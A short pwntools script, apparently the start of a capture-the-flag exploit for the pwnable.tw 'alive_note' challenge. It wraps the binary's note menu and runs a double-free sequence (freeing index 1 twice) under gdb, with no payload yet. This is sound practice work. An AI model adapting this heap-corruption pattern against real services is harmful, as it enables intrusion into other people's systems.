from pwn import *

context.log_level = 'debug'

local = 1

if local:
	p = process("./alive_note")
else:
	p = remote("chall.pwnable.tw", "12")


def menu(choice):
	p.sendlineafter("Your choice :", str(choice))

def add(idx, name):
	menu(1)
	p.sendlineafter("Index :", str(idx))
	p.sendlineafter("Name :", name)

def remove(idx):
	menu(3)
	p.sendlineafter("Index :", str(idx))
	
def show(idx):
	menu(2)
	p.sendlineafter("Index :", str(idx))
	
gdb.attach(p)
add(1, "1")
add(2, "2")
remove(1)
remove(2)
remove(1)
add(3, "3")
add(4, "4")
add(5, "5")
remove(3)
show(5)
p.interactive()

	
	


